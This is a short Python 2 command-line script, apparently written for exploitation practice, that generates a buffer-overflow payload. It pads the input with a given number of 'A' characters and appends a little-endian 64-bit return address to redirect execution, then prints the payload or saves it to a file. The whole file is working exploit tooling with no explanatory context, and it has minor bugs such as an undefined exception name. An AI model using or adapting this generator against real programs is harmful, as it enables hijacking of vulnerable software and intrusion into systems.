#!/usr/bin/python

import sys

def print_usage():
    print "usage:\n$arg1 target address without x char\n$arg2 offset in hex\n-f {filepathtosave}"
    print "e. g. ./jumptoaddress 0000000000400658 48 -f ~/exploits/jumppayload"

def check_target_address(target_addrss):
    if len(target_addrss) != 16:
        print "Error, currently only 64 bit addresses supported!"
        exit(1)

def reverse_target(words):
    words_reversed = []
    for w in reversed(words):
        words_reversed.append(bytearray.fromhex(w).decode())

    print "payload:<" + "".join(words_reversed)+">"
    print "length:" + str(len("".join(words_reversed)))
    return "".join(words_reversed)

def target_address_to_little_endian(target_address):
    chunks, chunk_size = len(target_address), len(target_address)/8
    words =[target_address[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
    return reverse_target(words)

def offset_to_As(hex_offset):
    offs_dec = int(hex_offset, 16)
    print "offs in dec: " + str(offs_dec) + " chars"
    alist = ["A" for n in range(0, offs_dec)]
    return "".join(alist)

def save_into_file(payload, file_path):
    try:
        with open(file_path, 'w') as f:
            f.write(payload)
    except Err:
        print "Cannot write file to "+ file_path
        print Err

def output(payload, argv):
    if len(argv) > 4:
        flag = argv[3]
        if flag == "-f":
            file_path = argv[4]
            print "save into file " + file_path
            save_into_file(payload, file_path)
        else:
            print "unknown arg"
            print_usage()
    else:
        print payload

if len(sys.argv) > 2:
    target_address = str(sys.argv[1])
    check_target_address(target_address)
    hex_offset = str(sys.argv[2])
    print "target: 0x" + target_address + " offset: 0x" + hex_offset
    offset_as = offset_to_As(hex_offset)
    target_payload = target_address_to_little_endian(target_address)
    output(offset_as + target_payload, sys.argv)

else:
    print_usage()
